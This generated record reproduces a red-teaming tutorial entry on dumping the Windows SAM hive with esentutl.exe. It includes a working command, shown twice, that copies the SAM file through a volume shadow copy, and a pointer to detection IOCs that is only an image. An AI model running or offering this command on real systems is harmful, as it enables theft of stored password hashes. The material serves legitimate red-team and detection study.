---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping SAM via esentutl.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dumping-sam-via-esentutl.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

It's possible to use esentutl.exe that comes with Windows and dump SAM/Security hives like so:

## Preserved Body

````markdown
## Execution

It's possible to use esentutl.exe that comes with Windows and dump SAM/Security hives like so:

```
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
```

![](<../../_assets/image (632).png>)

## Observation

The below are some potential IOCs for detecting this technique:

![](<../../_assets/image (633).png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/dumping-sam-via-esentutl.exe.md)

## Evidence Excerpt

````text
_asset_filenames:
- image (632).png
- image (633).png
_body: '# Dumping SAM via esentutl.exe
## Execution
It''s possible to use esentutl.exe that comes with Windows and dump SAM/Security hives like so:
```
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
````
